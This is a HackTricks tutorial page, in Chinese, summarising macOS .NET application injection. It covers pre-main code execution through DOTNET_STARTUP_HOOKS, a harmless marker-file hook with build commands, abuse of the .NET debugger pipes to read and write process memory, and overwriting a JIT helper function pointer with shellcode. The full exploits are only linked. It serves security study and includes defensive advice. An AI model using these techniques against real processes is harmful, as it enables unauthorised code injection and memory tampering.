# macOS .Net Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

**这是文章 [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) 的摘要。请查看原文以获取更多细节！**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 及更高版本支持 `DOTNET_STARTUP_HOOKS` 环境变量。每个路径都必须标识一个托管程序集，该程序集包含一个全局 `StartupHook` 类型以及一个 `public static void Initialize()` 方法。主机会加载这些程序集，并在应用程序的 `Main` 入口点之前同步调用其初始化器，从而使攻击者能够控制环境，并利用一个可读取的 DLL 获得直接的 pre-main 代码执行原语。<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Hook assembly 必须与应用程序的 runtime 和 dependencies 兼容。包含目录分隔符的相对路径会被拒绝；请使用绝对路径，或使用可从默认加载上下文解析的 assembly name。trimmed applications 默认禁用 startup hooks，而 custom native hosts 可能会直接提供 runtime properties，而不是继承环境。<sup>[[2]](#references)</sup>

防御性 launcher 应清除 `DOTNET_STARTUP_HOOKS`，阻止对应用程序和共享 assembly 路径的不受信任写入，并分别测试 self-contained 和 trimmed deployments。

## .NET Core 调试 <a href="#net-core-debugging" id="net-core-debugging"></a>

### **建立调试会话** <a href="#net-core-debugging" id="net-core-debugging"></a>

.NET 中 debugger 与 debuggee 之间通信的处理由 [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) 管理。该组件为每个 .NET process 设置两个 named pipes，如 [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) 所示；这些 pipes 通过 [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) 初始化。这些 pipes 的后缀为 **`-in`** 和 **`-out`**。

访问用户的 **`$TMPDIR`**，即可找到可用于调试 .NET applications 的 debugging FIFOs。

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) 负责管理来自 debugger 的通信。要启动新的 debugging session，debugger 必须通过 `out` pipe 发送一条以 `MessageHeader` struct 开头的消息，具体定义见 .NET source code：
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
要请求新会话时，该结构体按如下方式填充，将消息类型设置为 `MT_SessionRequest`，并将协议版本设置为当前版本：
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
此 header 随后通过 `write` syscall 发送到目标，后面是包含会话 GUID 的 `sessionRequestData` struct：
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
对 `out` pipe 执行读取操作可确认 debugging session 建立成功或失败：
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## 读取内存

建立 debugging session 后，可以使用 [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) message type 读取内存。函数 readMemory 详细执行了发送读取请求并获取响应所需的步骤：
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
完整的概念验证（POC）可在[此处](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b)查看。

## 写入内存

同样，可以使用 `writeMemory` 函数写入内存。该过程包括将消息类型设置为 `MT_WriteMemory`，指定数据的地址和长度，然后发送数据：
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
相关的 POC 位于[此处](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)。

## .NET Core 代码执行 <a href="#net-core-code-execution" id="net-core-code-execution"></a>

要执行代码，需要识别具有 rwx 权限的内存区域，这可以使用 vmmap -pages:完成。
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
定位一个可以覆盖函数指针的位置是必要的。在 .NET Core 中，可以通过 targeting **Dynamic Function Table (DFT)** 来实现。该表的详细信息见 [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h)，runtime 使用它来存储 JIT 编译辅助函数。

对于 x64 系统，可以使用 signature hunting 在 `libcorclr.dll` 中查找符号 `_hlpDynamicFuncTable` 的引用。

`MT_GetDCB` debugger 函数提供了有用的信息，包括辅助函数 `m_helperRemoteStartAddr` 的地址，该地址表示 `libcorclr.dll` 在进程内存中的位置。随后使用此地址开始搜索 DFT，并将函数指针覆盖为 shellcode 的地址。

用于注入 PowerShell 的完整 POC 代码可在[此处](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6)获取。

## References

- [1] [Adam Chester (xpnsec) - 通过第三方 Frameworks 进行 macOS Injection](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [.NET runtime host 启动 hook 设计](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
